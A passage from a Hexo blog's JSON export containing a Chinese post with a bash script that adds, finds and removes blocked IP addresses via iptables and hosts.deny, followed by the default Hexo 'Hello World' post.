&quot;\\033[32mhosts.deny:\\033[0m \\n\\033[31mDoes not exist!!!\\033[0m&quot; fi route -n | grep $IP &amp;&gt; /dev/null if [ $(echo $?) -lt 1 ] then echo -e &quot;\\n&quot; echo -e &quot;\\033[32mroute blocklist: \\033[0m&quot; route -n | grep $IP else echo -e &quot;\\n&quot; echo -e &quot;\\033[32mroute blocklist:\\033[0m \\n\\033[31mDoes not exist!!!\\033[0m&quot; fielse echo -e &quot;\\n&quot; echo -e &quot;\\033[31mUnknown Options.\\033[0m&quot;fi 重新修改后的脚本代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#!/bin/bash##version: 1.0.2#by: lucissfer#date: 2015-12-15 17:00add_ip() &#123; iptables -I INPUT -s $ip -j DROP echo &quot;ALL: $ip&quot; &gt;&gt; /etc/hosts.deny echo -e &quot;\\033[31m$ip\\033[0m has been added to the blocklist !!!!&quot;&#125;find_ip() &#123; iptables -nvL --line | grep $ip &amp;&gt; /dev/null if [ $(echo $?) -lt 1 ] then echo -e &quot;\\n&quot; echo -e &quot;\\033[32miptables: \\033[0m&quot; iptables -nvL --line | grep $ip else echo -e &quot;\\n&quot; echo -e &quot;\\033[32miptables:\\033[0m \\n\\033[31mDoes not exist!!!\\033[0m&quot; fi cat /etc/hosts.deny | grep $ip &amp;&gt; /dev/null if [ $(echo $?) -lt 1 ] then echo -e &quot;\\n&quot; echo -e &quot;\\033[32mhosts.deny: \\033[0m&quot; cat /etc/hosts.deny | grep $ip else echo -e &quot;\\n&quot; echo -e &quot;\\033[32mhosts.deny:\\033[0m \\n\\033[31mDoes not exist!!!\\033[0m&quot; fi route -n | grep $ip &amp;&gt; /dev/null if [ $(echo $?) -lt 1 ] then echo -e &quot;\\n&quot; echo -e &quot;\\033[32mroute blocklist: \\033[0m&quot; route -n | grep $ip else echo -e &quot;\\n&quot; echo -e &quot;\\033[32mroute blocklist:\\033[0m \\n\\033[31mDoes not exist!!!\\033[0m&quot; fi&#125;remove_ip() &#123; iptables -nvL --line | grep $ip &amp;&gt; /dev/null if [ $(echo $?) -lt 1 ] then iptables -D INPUT -s $ip -j DROP iptables -nvL --line | grep $ip &amp;&gt; /dev/null while [ $(echo $?) -lt 1 ] do iptables -D INPUT -s $ip -j DROP iptables -nvL --line | grep $ip &amp;&gt; /dev/null done echo -e &quot;\\033[31m$ip\\033[0m has been removed from iptables.&quot; else echo -e &quot;\\033[32miptables: \\033[0m\\033[31m$ip\\033[0m does not exist.&quot; fi echo -e &quot;\\n&quot; sed -i &quot;/$ip/d&quot; /etc/hosts.deny &amp;&gt; /dev/null echo -e &quot;\\033[31m$ip\\033[0m has been removed from hosts.deny.&quot; echo -e &quot;\\n&quot; ip route del $ip &amp;&gt; /dev/null if [ $(echo $?) -lt 1 ] then echo -e &quot;\\033[31m$ip\\033[0m has been removed from routing list.&quot; else echo -e &quot;\\033[31m$ip\\033[0m does not exist.&quot; fi&#125;echo &quot;The defined Options are:&quot;echo &quot; 1: Add ip to blocklist&quot;echo &quot; 2: Find ip from the blocklist&quot;echo &quot; Any other character (except 1,2) exits&quot;read -p &quot;Select Options (1-2): &quot; optionif [ &quot;$option&quot; == &quot;1&quot; ]then read -p &quot;Please Input ip address(&apos;q&apos; to quit): &quot; ip until [[ &quot;$ip&quot; == &quot;q&quot; ]]; do add_ip read -p &quot;Please Input ip address(&apos;q&apos; to quit): &quot; ip doneelif [ &quot;$option&quot; == &quot;2&quot; ]then read -p &quot;Please Input ip address(&apos;q&apos; to quit): &quot; ip until [[ &quot;$ip&quot; == &quot;q&quot; ]]; do find_ip read -p &quot;Whether to remove $ip(&apos;y&apos; or &apos;n&apos;): &quot; option if [ &quot;$option&quot; == &quot;y&quot; ] then remove_ip fi read -p &quot;Please Input ip address(&apos;q&apos; to quit): &quot; ip doneelse echo -e &quot;\\n&quot; echo -e &quot;\\033[31mUnknown Options.\\033[0m&quot;fi 此文仅作记录，待我日后水平更高了，再回来重新改写，目前凑合着用吧。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.unixmen.cn/categories/Linux/"}],"tags":[{"name":"block_ip","slug":"block-ip","permalink":"http://blog.unixmen.cn/tags/block-ip/"}]},{"title":"Hello World !","slug":"hello-world","date":"2015-11-30T16:00:00.000Z","updated":"2018-06-11T14:53:04.000Z","comments":true,"path":"2015/12/01/hello-world/","link":"","permalink":"http://blog.unixmen.cn/2015/12/01/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post1$ hexo new \"My New Post\"\nMore info: Writing\nRun server1$ hexo server\nMore info: Server","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","raw":null,"content":null,"categories":[],"tags":[]}]}